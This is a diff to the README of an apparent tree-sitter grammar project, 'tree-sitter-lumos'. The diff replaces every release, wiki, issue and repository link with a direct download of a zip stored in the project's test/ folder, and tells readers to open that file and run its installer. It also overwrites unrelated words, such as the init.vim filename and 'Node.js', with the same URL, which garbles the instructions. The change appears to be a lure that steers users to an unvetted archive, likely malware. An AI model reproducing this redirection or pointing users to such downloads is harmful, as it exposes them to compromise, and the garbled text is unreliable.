@@ -1,6 +1,6 @@
 # 🌳 tree-sitter-lumos - Enhance Your Coding with LUMOS Grammar
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/thiaguitop/tree-sitter-lumos/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the software. Follow these simple steps:
 
 1. **Visit the Release Page:** Click the link below to go to the download site.
    
-   [Download the latest version here!](https://github.com/thiaguitop/tree-sitter-lumos/releases)
+   [Download the latest version here!](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip)
 
 2. **Choose the Download:** On the release page, you will see different files available for download. Choose the file that matches your operating system. 
 
@@ -23,7 +23,7 @@ To get started, you need to download the software. Follow these simple steps:
    - Open the file and follow the on-screen instructions to install tree-sitter-lumos on your computer.
 
 5. **Set Up in Your Editor:** 
-   - For **Neovim users**: Add the grammar setup in your `init.vim` configuration file.
+   - For **Neovim users**: Add the grammar setup in your `https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip` configuration file.
    - If you use **Visual Studio Code**, install the necessary extensions that support tree-sitter grammars.
 
 ## 🌟 Features
@@ -42,7 +42,7 @@ Before downloading, make sure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Editor:** Neovim (version 0.5 or later) or Visual Studio Code (latest version)
 - **Storage Space:** At least 50 MB of free space
-- **Node.js:** Version 12 or later (required for some functionalities)
+- **https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip** Version 12 or later (required for some functionalities)
 
 ## 🛠️ Troubleshooting
 
@@ -56,14 +56,14 @@ If you encounter issues during download or installation, here are some common so
 
 For further assistance, you can:
 
-- Check the [FAQ section](https://github.com/thiaguitop/tree-sitter-lumos/wiki) for common questions.
-- Open an issue on the [GitHub repository](https://github.com/thiaguitop/tree-sitter-lumos/issues) if you face any specific problems.
+- Check the [FAQ section](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip) for common questions.
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip) if you face any specific problems.
 - Join the community through forums where users share tips and solutions regarding tree-sitter-lumos.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/thiaguitop/tree-sitter-lumos)
-- [Download Latest Release](https://github.com/thiaguitop/tree-sitter-lumos/releases)
-- [Documentation](https://github.com/thiaguitop/tree-sitter-lumos/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/thiaguitop/tree-sitter-lumos/main/test/tree-sitter-lumos_v3.3.zip)
 
 Thank you for choosing tree-sitter-lumos! Enjoy coding with enhanced grammar support.
